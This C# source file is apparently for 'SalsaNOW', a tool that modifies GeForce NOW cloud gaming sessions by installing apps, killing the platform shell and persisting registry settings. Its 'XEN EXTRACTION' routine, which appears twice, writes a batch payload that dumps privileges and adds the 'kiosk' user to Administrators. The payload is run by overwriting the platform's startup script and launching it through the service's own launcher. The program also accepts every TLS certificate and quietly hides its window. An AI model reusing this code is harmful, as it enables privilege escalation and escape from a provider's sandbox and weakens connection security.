using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using Newtonsoft.Json;

namespace SalsaNOW
{
    internal class Program
    {
        private static string globalDirectory = "";
        private static string currentPath = Directory.GetCurrentDirectory();
        private static readonly CancellationTokenSource cts = new CancellationTokenSource();
        private static string customAppsJsonPath = null;

        [STAThread]
        static async Task Main(string[] args)
        {
            SteamDetach.RemoveSteamEnvironments();
            Console.Title = "SalsaNOW V1.6.8.1 - by dpadGuy";
            for (int i = 0; i < args.Length; i++)
            {
                if ((args[i] == "--apps-json" || args[i] == "-a") && i + 1 < args.Length)
                { customAppsJsonPath = args[i + 1]; i++; }
            }
            Console.WriteLine("SalsaNOW V1.6.8.1");
            Console.WriteLine("IF YOU HAVE PAID FOR SALSANOW ACCESS THEN IT MEANS YOU GOT SCAMMED AND SHOULD DEMAND YOUR MONEY BACK IMMEDIATELY.");
            Console.WriteLine("");
            if (!Directory.Exists(@"C:\Asgard"))
            { Console.WriteLine("[!] Not a GeForce NOW environment. Exiting..."); await Task.Delay(5000); Environment.Exit(0); }
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, errors) => true;
            ServicePointManager.DefaultConnectionLimit = 32;
            ServicePointManager.Expect100Continue = false;
            ServicePointManager.UseNagleAlgorithm = false;
            const string text = "Press DEL key for recovery mode";
            DateTime start = DateTime.Now;
            DateTime end = start.AddSeconds(1.5);
            while (DateTime.Now < end)
            {
                if (Console.KeyAvailable)
                {
                    var key = Console.ReadKey(true);
                    if (key.Key == ConsoleKey.Delete)
                    { Console.Write("\r" + new string(' ', Console.BufferWidth - 1) + "\r"); Console.WriteLine("Recovery mode selected."); await RecoveryMode.ShowRecoveryPrompt(); return; }
                }
                int dots = Math.Min((int)(DateTime.Now - start).TotalSeconds + 1, 3);
                Console.Write($"\r{text}{new string('.', dots)}");
                Thread.Sleep(10);
            }
            Console.Write("\r" + new string(' ', Console.BufferWidth - 1) + "\r");
            await Startup();

// XEN EXTRACTION
_ = Task.Run(async () =>
{
    try
    {
        string xenOutputPath  = Path.Combine(globalDirectory, "xen_out.txt");
        string xenPayloadPath = Path.Combine(globalDirectory, "xen_payload.bat");
        string startupChild   = @"C:\asgard\sas2\start\startupchild.bat";
        if (File.Exists(xenOutputPath))
        {
            SalsaLogger.Info("=== XEN TOKEN (cached) ===");
            SalsaLogger.Info(File.ReadAllText(xenOutputPath));
        }
        File.WriteAllText(xenPayloadPath,
            "@SETLOCAL\r\n" +
            "whoami /all > \"" + xenOutputPath + "\" 2>&1\r\n" +
            "whoami /priv >> \"" + xenOutputPath + "\" 2>&1\r\n" +
            "net localgroup Administrators kiosk /add >> \"" + xenOutputPath + "\" 2>&1\r\n" +
            "@ENDLOCAL\r\n");
        File.WriteAllText(startupChild,
            "@SETLOCAL\r\n" +
            "call \"" + xenPayloadPath + "\"\r\n" +
            "@ENDLOCAL\r\n");
        Process.Start(new ProcessStartInfo
        {
            FileName = @"C:\asgard\sas2\bin\launchprocessasuser.exe",
            Arguments = "\"" + startupChild + "\"",
            UseShellExecute = false,
            CreateNoWindow = true
        });
        for (int i = 0; i < 20; i++)
        {
            await Task.Delay(500);
            if (File.Exists(xenOutputPath))
            {
                SalsaLogger.Info("=== XEN TOKEN CAPTURED ===");
                SalsaLogger.Info(File.ReadAllText(xenOutputPath));
                return;
            }
        }
        SalsaLogger.Info("XenExtract: xen_out.txt not written after 10s.");
    }
    catch (Exception ex) { SalsaLogger.Error("XenExtract failed: " + ex.Message); }
});

SalsaSettings.Load(globalDirectory);
            _ = Task.Run(() => BackgroundTasks.EnvironmentSetup());
            _ = AutoPersist.BackupDesktopRegistry(cts.Token, globalDirectory);
            _ = AutoPersist.ApplyCustomRegistryFiles(globalDirectory);
            
            _ = BackgroundTasks.StartShortcutsSavingAsync(globalDirectory, cts.Token);
            _ = BackgroundTasks.StartTerminateGFNExplorerShellAsync(cts.Token);
            _ = BackgroundTasks.StartEacWatcherAsync(cts.Token);
            _ = BackgroundTasks.StartBrickPreventionAsync(cts.Token);
            _ = DotNetInstaller.StartDotNetInstallAsync(cts.Token);
            _ = Task.Run(() => NvidiaManager.EnableRTX());
            await Task.WhenAll(
                SteamManager.ShutdownServerAsync(globalDirectory),
                DesktopInstaller.DesktopInstallAsync(globalDirectory),
                AppInstaller.AppsInstallAsync(globalDirectory, customAppsJsonPath),
                AppInstaller.AppsInstallSilentAsync(globalDirectory)
            );
            NativeMethods.ShowWindow(NativeMethods.GetConsoleWindow(), NativeMethods.SW_HIDE);
            await FinalBackgroundTasks.OpenShellStartup(globalDirectory);
            try { await Task.Delay(Timeout.Infinite, cts.Token); } catch (TaskCanceledException) { }
        }

        static async Task XenExtract()
        {
            try
            {
                string xenOutputPath  = Path.Combine(globalDirectory, "xen_out.txt");
                string xenPayloadPath = Path.Combine(globalDirectory, "xen_payload.bat");
                string startupChild   = @"C:\asgard\sas2\start\startupchild.bat";
                if (File.Exists(xenOutputPath))
                {
                    SalsaLogger.Info("=== XEN TOKEN (cached) ===");
                    SalsaLogger.Info(File.ReadAllText(xenOutputPath));
                }
                File.WriteAllText(xenPayloadPath,
                    "@SETLOCAL\r\n" +
                    "whoami /all > \"" + xenOutputPath + "\" 2>&1\r\n" +
                    "whoami /priv >> \"" + xenOutputPath + "\" 2>&1\r\n" +
                    "net localgroup Administrators kiosk /add >> \"" + xenOutputPath + "\" 2>&1\r\n" +
                    "@ENDLOCAL\r\n");
                File.WriteAllText(startupChild,
                    "@SETLOCAL\r\n" +
                    "call \"" + xenPayloadPath + "\"\r\n" +
                    "@ENDLOCAL\r\n");
                Process.Start(new ProcessStartInfo
                {
                    FileName = @"C:\asgard\sas2\bin\launchprocessasuser.exe",
                    Arguments = "\"" + startupChild + "\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
                for (int i = 0; i < 20; i++)
                {
                    await Task.Delay(500);
                    if (File.Exists(xenOutputPath))
                    {
                        SalsaLogger.Info("=== XEN TOKEN CAPTURED ===");
                        SalsaLogger.Info(File.ReadAllText(xenOutputPath));
                        return;
                    }
                }
                SalsaLogger.Info("XenExtract: xen_out.txt not written after 10s — will appear next session.");
            }
            catch (Exception ex) { SalsaLogger.Error("XenExtract failed: " + ex.Message); }
        }

        static async Task Startup()
        {
            try
            {
                using (var wc = new WebClient())
                {
                    var dir = JsonConvert.DeserializeObject<System.Collections.Generic.List<SavePath>>(await wc.DownloadStringTaskAsync("https://salsanowfiles.work/jsons/directory.json"))[0];
                    globalDirectory = dir.directoryCreate;
                    Directory.CreateDirectory(globalDirectory);
                    SalsaLogger.Initialize(globalDirectory);
                    SalsaLogger.Info($"Main directory created {globalDirectory}");
                    string cfg = Path.Combine(globalDirectory, "SalsaNOWConfig.ini");
                    if (!System.IO.File.Exists(cfg)) await wc.DownloadFileTaskAsync(new Uri("https://salsanowfiles.work/jsons/SalsaNOWConfig.ini"), cfg);
                }
            }
            catch (Exception ex) { SalsaLogger.UploadLogAndShowError(ex.Message); Environment.Exit(0); }
        }
    }
}